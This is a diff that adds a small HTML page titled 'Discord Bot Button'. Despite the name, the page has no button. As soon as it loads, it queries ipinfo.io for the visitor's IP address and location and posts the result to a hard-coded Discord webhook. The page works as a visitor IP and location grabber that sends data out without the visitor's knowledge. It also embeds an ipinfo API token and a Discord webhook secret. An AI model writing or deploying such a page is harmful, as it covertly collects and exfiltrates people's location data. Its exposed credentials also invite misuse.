@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Discord Bot Button</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  </head>
+  <body>
+    <script>
+      $(document).ready(function() {
+        fetch('https://ipinfo.io/json?token=b24897d608d575')
+        .then(response => response.json())
+        .then(data => {
+          var splitStr = JSON.stringify(data).slice(1, -1).replace(/"/g, "").split(",");
+          var message = splitStr.map(function(str) {
+            return "> **" + str + "**"; // Add "> **" and "**" to each element
+          }).join("\n"); // Join array elements with a line break
+          message += "\n> **------------------------**"; // Add the separator line
+          $.ajax({
+            type: "POST",
+            url: "https://discord.com/api/webhooks/1106977048477565109/KsNlQgxB9bK_EtzP7PsytcavVKgp-DFYiBtqnEZXu2BUr_XJjWPVfrwSbX_8fQJPRkGg",
+            data: {
+              "content": message // Use the modified message string
+            },
+            success: function() {
+              alert("Message sent!");
+            },
+            error: function() {
+              alert("Error sending message!");
+            }
+          });
+        })
+        .catch(error => {
+          console.error(error);
+        });
+      });
+    </script>
+  </body>
+</html>
